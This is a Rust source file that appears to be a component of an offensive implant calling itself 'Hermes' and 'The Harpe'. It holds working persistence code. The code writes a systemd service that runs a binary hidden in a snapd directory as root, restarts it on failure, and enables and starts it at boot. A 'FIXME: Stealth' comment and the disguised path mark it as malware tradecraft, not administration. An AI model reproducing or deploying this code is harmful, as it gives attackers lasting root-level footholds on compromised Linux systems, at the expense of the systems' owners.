/// The Harpe
/// Hermes weapon of choice
/// Prebaked commands live here
use std::process::Command;
use tokio::io;
use tokio::io::AsyncWriteExt;

pub async fn setup_systemd_service() -> Result<(), io::Error> {
    // FIXME: Stealth
    const SERVICE_NAME: &str = "pantheon_service";
    const DESCRIPTION: &str = "May the Gods rest peacefully in your network traffic";

    // Systemd service file
    let service_content = format!(
        "[Unit]\n\
        Description={}\n\
        After=network.target\n\n\
        [Service]\n\
        ExecStart=/var/snap/snapd/common/hermes\n\
        Restart=always\n\
        User=root\n\
        Group=root\n\n\
        [Install]\n\
        WantedBy=multi-user.target",
        DESCRIPTION
    );

    // Save the service content to the systemd folder
    let mut file =
        tokio::fs::File::create(format!("/etc/systemd/system/{}.service", SERVICE_NAME)).await?;
    file.write_all(service_content.as_bytes()).await?;

    // Reload systemd to recognize the new service
    let _ = Command::new("systemctl").arg("daemon-reload").output();

    // Enable the service to start on boot
    let _ = Command::new("systemctl")
        .arg("enable")
        .arg(SERVICE_NAME)
        .output();

    // Start the service immediately
    let _ = Command::new("systemctl")
        .arg("start")
        .arg(SERVICE_NAME)
        .output();

    Ok(())
}
